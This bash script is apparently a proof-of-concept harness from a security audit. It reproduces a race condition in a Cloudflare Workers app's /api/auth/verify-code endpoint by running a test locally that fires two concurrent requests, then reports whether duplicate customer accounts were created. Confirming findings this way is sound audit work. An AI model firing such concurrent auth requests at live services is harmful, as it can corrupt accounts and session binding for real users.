#!/usr/bin/env bash
# P10-011 PoC executor: find-or-create customer duplicate race.
#
# Provisions the real worker in workerd (@cloudflare/vitest-pool-workers,
# local D1 with the project's real migrations) and fires two concurrent
# POST /api/auth/verify-code requests for one identity.
#
# Usage: ./exploit.sh [repo-root]   (default: repo root inferred from this file)
set -euo pipefail

FD="$(cd "$(dirname "$0")" && pwd)"
ROOT="${1:-$(cd "$FD/../../.." && pwd)}"
WORKERS="$ROOT/site/workers"

# 1. Provision: drop PoC test into the workers test dir (real vitest pool).
cp "$FD/poc.test.ts" "$WORKERS/tests/poc-p10-011.test.ts"
trap 'rm -f "$WORKERS/tests/poc-p10-011.test.ts"' EXIT

# 2. Healthcheck: schema precondition — no UNIQUE on customers.email.
if grep -q 'email TEXT NOT NULL,' "$WORKERS/migrations/0000_current_baseline.sql"; then
  echo "[healthcheck] customers.email has no UNIQUE constraint (baseline line 301): OK"
else
  echo "[healthcheck] FAILED: could not verify missing UNIQUE constraint"
  exit 1
fi

# 3. Exploit: run against the real worker in workerd.
cd "$WORKERS"
set +e
npx vitest run --disable-console-intercept tests/poc-p10-011.test.ts \
  > "$FD/evidence/exploit.raw.log" 2>&1
RC=$?
set -e

grep -E "P10_011|Test Files|Tests " "$FD/evidence/exploit.raw.log" | tee "$FD/evidence/exploit.log"
grep -E "P10_011_RESULT" "$FD/evidence/exploit.raw.log" | sed 's/^P10_011_RESULT //' > "$FD/evidence/impact.log"
cat "$FD/evidence/impact.log"

# 4. Structured verdict (last stdout line).
if grep -q "P10_011_RESULT reproduced" "$FD/evidence/exploit.raw.log"; then
  IDS=$(grep -oP '(?<="duplicate_customer_ids=)\[[^]]*\]' "$FD/evidence/impact.log" | head -1)
  printf '{"status": "confirmed", "evidence": "two customer rows for one email; two concurrent sessions bound to two distinct customer ids (%s)", "notes": "reproduced via double POST /api/auth/verify-code against real worker in workerd + D1"}\n' "${IDS:-see impact.log}"
elif [ $RC -eq 0 ]; then
  echo '{"status": "inconclusive", "evidence": "test passed but race not reproduced in 5 rounds", "notes": "timing-dependent; retry on quieter machine"}'
else
  echo '{"status": "failed", "evidence": "vitest run failed", "notes": "see evidence/exploit.raw.log"}'
fi
